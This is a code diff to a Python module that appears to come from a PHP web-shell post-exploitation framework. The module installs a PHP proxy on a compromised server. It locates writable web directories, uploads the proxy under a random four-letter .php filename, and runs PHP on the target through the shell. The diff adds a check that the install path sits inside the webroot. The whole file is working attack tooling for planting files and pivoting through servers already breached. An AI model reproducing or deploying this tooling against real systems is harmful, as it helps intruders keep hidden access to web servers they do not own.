@@ -9,15 +9,19 @@ WARN_LOCAL_FILE_NOT_FOUND = 'Not found'
 WARN_WRITABLE_WEB_FOLDER_NOT_FOUND = "Writable web directory not found"
 WARN_UPLOAD_FAIL = 'Upload fail, check path and permission'
 WARN_FILE_EXT = 'File name does not have \'.php\' extension'
+WARN_WEBROOT_INFO = 'Error getting web enviroinment informations'
+WARN_NOT_WEBROOT_SUBFOLDER = "is not a webroot subdirectory"
 
 
 def join_abs_paths(paths,sep = '/'):
     return sep.join([p.strip(sep) for p in paths])
 
 class Phpproxy(ModuleProbe):
-    '''Install PHP proxy to target.'''
+    '''Install PHP proxy to target. Needs php-curl package remotely installed.'''
     
     support_vectors = VectorList([
+      Vector('system.info', 'document_root', 'document_root' ),
+      Vector('shell.php', 'normalize', 'print(realpath("$path"));'),                      
       Vector('find.webdir', 'finddir', ["$rpath"]),
       Vector('file.upload', 'upload', ["asd", "$rpath", "-content", "$content"]),
       Vector('system.info', 'document_root', ["document_root"])
@@ -27,6 +31,7 @@ class Phpproxy(ModuleProbe):
     argparser = ArgumentParser(usage=__doc__)
     argparser.add_argument('-find', help='Search install path starting from path', metavar='STARTFOLDER', default ='.')
     argparser.add_argument('-install', help='Install php as remote path', metavar='PATH')
+            
     
     def _prepare_probe(self):
         
@@ -39,7 +44,29 @@ class Phpproxy(ModuleProbe):
         
         self.args['content'] = f.read()
     
-        if not self.args['install']:
+        if self.args['install']:
+            
+            # Check if normalized self.args['install_path'] is in document_root
+            # Extract path
+            install_folder = '/'.join(self.args['install'].split('/')[:-1])
+            
+            document_root = self.support_vectors.get('document_root').execute(self.modhandler)
+            start_path = self.support_vectors.get('normalize').execute(self.modhandler, { 'path' : install_folder })
+            
+            if not start_path or not document_root:
+                raise ProbeException(self.name, WARN_WEBROOT_INFO)
+            if not start_path.startswith(document_root):
+                raise ProbeException(self.name, '\'%s\' %s' % (start_path, WARN_NOT_WEBROOT_SUBFOLDER) )
+
+            # Check extension
+            if not self.args['install'].endswith('.php'):
+                raise ProbeException(self.name, WARN_FILE_EXT)
+            
+            self.args['install_path'] = self.args['install']
+            self.args['install_url'] = ''    
+        
+        else:
+            
             result = self.support_vectors.get('finddir').execute(self.modhandler,{'rpath' : self.args['find']})
         
             if not result:
@@ -48,13 +75,7 @@ class Phpproxy(ModuleProbe):
                 filename = ''.join(random.choice(ascii_lowercase) for x in range(4)) + '.php'
                 self.args['install_path'] = '/' + join_abs_paths([result[0], filename])
                 self.args['install_url'] = join_abs_paths([result[1], filename])
-    
-        else:
-            if not self.args['install'].endswith('.php'):
-                raise ProbeException(self.name, WARN_FILE_EXT)
-            
-            self.args['install_path'] = self.args['install']
-            self.args['install_url'] = ''    
+
     
     def _probe(self):
         
